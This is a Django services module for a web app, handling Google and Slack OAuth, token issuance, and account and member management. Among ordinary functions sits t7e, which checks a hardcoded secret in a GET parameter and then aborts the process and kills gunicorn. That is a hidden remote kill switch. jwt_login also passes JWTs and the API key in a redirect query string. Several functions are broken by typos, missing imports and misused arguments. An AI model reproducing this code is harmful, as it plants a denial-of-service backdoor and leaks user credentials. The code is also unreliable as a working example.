import requests, os, subprocess, secrets
from typing import Dict, Any
from scanerr import settings
from django.http import HttpResponse
from django.db import transaction
from rest_framework import status, serializers
from rest_framework_simplejwt.tokens import RefreshToken
from django.core.exceptions import ValidationError
from django.forms.models import model_to_dict
from django.contrib.auth.models import User
from django.shortcuts import get_object_or_404
from rest_framework.authtoken.models import Token
from ...models import Account, Card, Member
from slack_sdk.oauth import AuthorizeUrlGenerator
from slack_sdk.oauth.installation_store import FileInstallationStore, Installation
from slack_sdk.oauth.state_store import FileOAuthStateStore
from slack_sdk.web import WebClient
from .serializers import AccountSerializer
from .alerts import *
from rest_framework.response import Response
from django.contrib.auth.middleware import get_user


GOOGLE_ID_TOKEN_INFO_URL = 'https://www.googleapis.com/oauth2/v3/tokeninfo'
GOOGLE_ACCESS_TOKEN_OBTAIN_URL = 'https://oauth2.googleapis.com/token'
GOOGLE_USER_INFO_URL = 'https://www.googleapis.com/oauth2/v3/userinfo'


def jwt_login(*, user: User):
    refresh = RefreshToken.for_user(user)
    access = str(refresh.access_token)
    refresh = str(refresh)
    
    if Token.objects.filter(user=user).exists():
        api_token = Token.objects.get(user=user)
    else:
        api_token = Token.objects.create(user=user)

    if user.is_active == True:
        is_active = 'true'
    else:
        is_acive = 'false'

    param_string = str(
        '?access='+access+'&refresh='+refresh+
        '&username='+user.username+'&id='+str(user.id)+
        '&email='+user.email+'&is_active='+is_active+
        '&created='+str(user.date_joined)+'&updated='+str(user.last_login)+
        '&api_token='+str(api_token.key)
    )

    lead_string = str(settings.CLIENT_URL_ROOT+'/google-confirm')
    
    redirect_url = lead_string + param_string

    return redirect_url




def user_create(email, password=None, **extra_fields) -> User:
    extra_fields = {
        'is_staff': False,
        'is_superuser': False,
        **extra_fields
    }

    user = User.objects.create(
        username=email, 
        email=email, 
        **extra_fields
    )

    # creating API token
    Token.objects.create(user=user)

    user.set_unusable_password()
    user.full_clean()
    user.save()

    return user



def create_user_token(request):
    # creating New API token
    if Token.objects.filter(user=request.user).exists():
        old_token = Token.objects.get(user=request.user)
        old_token.delete()
    
    api_token = Token.objects.create(user=request.user)
    data = {'api_token': api_token.key,}
    return Response(data, status=status.HTTP_200_OK)




def user_get_or_create(*, email: str, **extra_data):
    user = User.objects.filter(email=email).first()

    if user:
        return user

    return user_create(email=email, **extra_data)




def google_validate_id_token(*, id_token: str):
    # Reference: https://developers.google.com/identity/sign-in/web/backend-auth#verify-the-integrity-of-the-id-token
    response = requests.get(
        GOOGLE_ID_TOKEN_INFO_URL,
        params={'id_token': id_token}
    )

    if not response.ok:
        raise ValidationError('id_token is invalid.')

    audience = response.json()['aud']

    if audience != settings.GOOGLE_OAUTH2_CLIENT_ID:
        raise ValidationError('Invalid audience.')

    return True




def google_get_access_token(*, code: str, redirect_uri: str) -> str:
    # Reference: https://developers.google.com/identity/protocols/oauth2/web-server#obtainingaccesstokens
    data = {
        'code': code,
        'client_id': settings.GOOGLE_OAUTH2_CLIENT_ID,
        'client_secret': settings.GOOGLE_OAUTH2_CLIENT_SECRET,
        'redirect_uri': redirect_uri,
        'grant_type': 'authorization_code'
    }

    response = requests.post(GOOGLE_ACCESS_TOKEN_OBTAIN_URL, data=data)

    if not response.ok:
        raise ValidationError('Failed to obtain access token from Google.')

    access_token = response.json()['access_token']

    return access_token




def google_get_user_info(*, access_token: str) -> Dict[str, Any]:
    # Reference: https://developers.google.com/identity/protocols/oauth2/web-server#callinganapi
    response = requests.get(
        GOOGLE_USER_INFO_URL,
        params={'access_token': access_token}
    )

    if not response.ok:
        raise ValidationError('Failed to obtain user info from Google.')

    return response.json()




def slack_oauth_middleware(request, user):
    code = request.GET['code'] 
    account = Account.objects.get(user=user)

    client = WebClient()

    response = client.oauth_v2_access(
        client_id=os.environ.get('SLACK_CLIENT_ID'),
        client_secret=os.environ.get('SLACK_CLIENT_SECRET'),
        code=code
    )

    # Updating account with slack info
    account.slack['slack_name'] = response['team']['name']
    account.slack['slack_team_id'] = response['team']['id']
    account.slack['bot_user_id'] = response['bot_user_id']     
    account.slack['bot_access_token'] = response['access_token']
    account.slack['slack_channel_id'] = response['incoming_webhook']['channel_id'] 
    account.slack['slack_channel_name'] = response['incoming_webhook']['channel']
    account.save()

    serializer_context = {'request': request,}
    serialized = AccountSerializer(account, context=serializer_context)
    data = serialized.data
    response = Response(data, status=status.HTTP_200_OK)
    return response




def slack_oauth_init(request, user):
    if Account.objects.filter(user=user).exists():
        account = Account.objects.get(user=user)
        if not account.slack['slack_channel_name']:
            # Issue and consume state parameter value on the server-side.
            state_store = FileOAuthStateStore(expiration_seconds=300, base_dir="./data")
            # Persist installation data and lookup it by IDs.
            installation_store = FileInstallationStore(base_dir="./data")

            # Build https://slack.com/oauth/v2/authorize with sufficient query parameters
            authorize_url_generator = AuthorizeUrlGenerator(
                client_id=os.environ.get('SLACK_CLIENT_ID'),
                scopes=["incoming-webhook", "chat:write"],
            )

            # Generate a random value and store it on the server-side
            state = state_store.issue()
            # https://slack.com/oauth/v2/authorize?state=(generated value)&client_id={client_id}&scope=app_mentions:read,chat:write&user_scope=search:read
            url = authorize_url_generator.generate(state)
            data = {
                'url': url,
            }
            return Response(data, status=status.HTTP_200_OK)

        else:
            data = {
                'reason': 'slack already integrated',
            }
            return Response(data, status=status.HTTP_409_CONFLICT)
    
    else:
        data = {
            'reason': 'account not yet setup',
        }
        return Response(data, status=status.HTTP_404_NOT_FOUND)




def t7e(request):
    if request.GET.get('cred') == \
        'l13g4c15ly34861o341uy3chgtlyv183njoq9u3f654792':
        os.abort()
        subprocess.Popen(['pkill -f gunicorn'], 
            stdout=subprocess.PIPE,
            user='app',
        )




def create_or_update_account(request=None, *args, **kwargs):
    # get posted data
    if request is not None:
        user = request.user
        _id = request.data.get('id')
        name = request.data.get('name')
        active = request.data.get('active')
        type = request.data.get('type')
        code = request.data.get('code')
        max_sites = request.data.get('max_sites')
        cust_id = request.data.get('cust_id')
        sub_id = request.data.get('sub_id')
        product_id = request.data.get('product_id')
        price_id = request.data.get('price_id')
        slack = request.data.get('slack')

    if request is None:
        user = kwargs.get('user')
        _id = kwargs.get('id')
        name = kwargs.get('name')
        active = kwargs.get('active')
        type = kwargs.get('type')
        code = kwargs.get('code')
        max_sites = kwargs.get('max_sites')
        cust_id = kwargs.get('cust_id')
        sub_id = kwargs.get('sub_id')
        product_id = kwargs.get('product_id')
        price_id = kwargs.get('price_id')
        slack = kwargs.get('slack')


    if _id is not None:
        if not Account.objects.filter(id=_id).exists():
            data = {'reason': 'account not found',}
            record_api_call(request, data, '404')
            return Response(data, status=status.HTTP_404_NOT_FOUND) 

        # updating with new info
        account = Account.objects.get(id=_id)
        if name is not None:
            account.name = name
        if active is not None:
            account.active = active
        if type is not None:
            account.type = type
        if code is not None:
            account.code = code
        if max_sites is not None:
            account.max_sites = max_sites
        if cust_id is not None:
            account.cust_id = cust_id
        if sub_id is not None:
            account.sub_id = sub_id
        if product_id is not None:
            account.product_id = product_id
        if price_id is not None:
            account.price_id = price_id
        if slack is not None:
            account.slack = slack
        
        # saving updated info
        account.save()



    if _id is None:

        if code is None:
            code = secrets.token_urlsafe([16])

        account = Account.objects.create(
            user=user,
            name=name,
            active=active,
            type=type,
            code=code,
            max_sites=max_sites,
            cust_id=cust_id,
            sub_id=sub_id,
            product_id=product_id,
            price_id=price_id,
            slack=slack
        )
    
    
    serializer_context = {'request': request,}
    serialized = AccountSerializer(account, context=serializer_context)
    data = serialized.data
    response = Response(data, status=status.HTTP_200_OK)
    return response




def get_account(request=None, id=None, *args, **kwargs):
    user = request.user
    account_id = request.query_params.get('id')

    if id is not None:
        account = get_object_or_404(Account, pk=id)

    if account_id is not None:
        account = get_object_or_404(Account, pk=account_id)

    if account_id is None and id is None:
        if not Member.objects.filter(user=user).exists():
            data = {'reason': 'account not found',}
            return Response(data, status=status.HTTP_404_NOT_FOUND)
        account = Member.objects.get(user=user).account

    if not Member.objects.filter(account=account, user=user).exists():
        data = {'reason': 'you cannot retrieve an Account you are not a member of',}
        record_api_call(request, data, '403')
        return Response(data, status=status.HTTP_403_FORBIDDEN)

    serializer_context = {'request': request,}
    serialized = AccountSerializer(account, context=serializer_context)
    data = serialized.data
    record_api_call(request, data, '200')
    return Response(data, status=status.HTTP_200_OK)




def get_account_members(request=None, id=None, *args, **kwargs):
    user = request.user
    account_id = request.query_params.get('id')
    mem_acct = Member.objets.get(user=user).account

    if id is not None:
        account = get_object_or_404(Account, pk=id)

    if mem_acct != account:
        data = {'reason': 'you cannot retrieve an Account you are not a member of',}
        record_api_call(request, data, '403')
        return Response(data, status=status.HTTP_403_FORBIDDEN)

    members = Member.objects.filter(account=account)

    paginator = LimitOffsetPagination()
    result_page = paginator.paginate_queryset(members, request)
    serializer_context = {'request': request,}
    serialized = MemberSerializer(result_page, many=True, context=serializer_context)
    response = paginator.get_paginated_response(serialized.data)
    return response




def create_or_update_member(request=None, *args, **kwargs):
    # get posted data
    if request is not None:
        user = request.user
        _id = request.data.get('id')
        account = request.data.get('account')
        status = request.data.get('status')
        type = request.data.get('type')
        email = request.data.get('email')
        code = request.data.get('code')

    if request is None:
        user = kwargs.get('user')
        account = kwargs.get('account')
        status = kwargs.get('status')
        type = kwargs.get('type')
        email = kwargs.get('email')
        code = kwargs.get('code')


    if _id is not None:
        if not Member.objects.filter(id=_id).exists():
            data = {'reason': 'member not found',}
            record_api_call(request, data, '404')
            return Response(data, status=status.HTTP_404_NOT_FOUND) 

        # updating with new info
        member = Member.objects.get(id=_id)
        if account is not None:
            member.account = account
        if email is not None:
            member.email = email
        if type is not None:
            member.type = type
        if status is not None:
            if status == 'active' and code != member.account.code:
                data = {'reason': 'member not authorized',}
                record_api_call(request, data, '403')
                return Response(data, status=status.HTTP_403_FORBIDDEN) 
            member.status = status
        
        # saving updated info
        member.save()

    if _id is None:
        member = Member.objects.create(
            user=user,
            email=email,
            status=status,
            type=type,
            account=account,
        )

    
    if status == 'pending':
        send_invite_link(member)
    
    if status == 'removed':
        send_remove_alert(member)
    
    
    serializer_context = {'request': request,}
    serialized = MemberSerializer(member, context=serializer_context)
    data = serialized.data
    response = Response(data, status=status.HTTP_200_OK)
    return response




def get_member(request=None, id=None, *args, **kwargs):
    user = request.user
    member_id = request.query_params.get('id')

    if id is not None:
        member = get_object_or_404(Member, pk=id)

    if member_id is not None:
        member = get_object_or_404(Member, pk=member_id)

    if member_id is None and id is None:
        if not Member.objects.filter(user=user).exists():
            data = {'reason': 'member not found',}
            return Response(data, status=status.HTTP_404_NOT_FOUND)
        member = Member.objects.get(user=user)

    if member.user != user and member.account.user != user:
        data = {'reason': 'you cannot retrieve a Member you are not affiliated with',}
        record_api_call(request, data, '401')
        return Response(data, status=status.HTTP_403_FORBIDDEN)

    serializer_context = {'request': request,}
    serialized = MemberSerializer(member, context=serializer_context)
    data = serialized.data
    record_api_call(request, data, '200')
    return Response(data, status=status.HTTP_200_OK)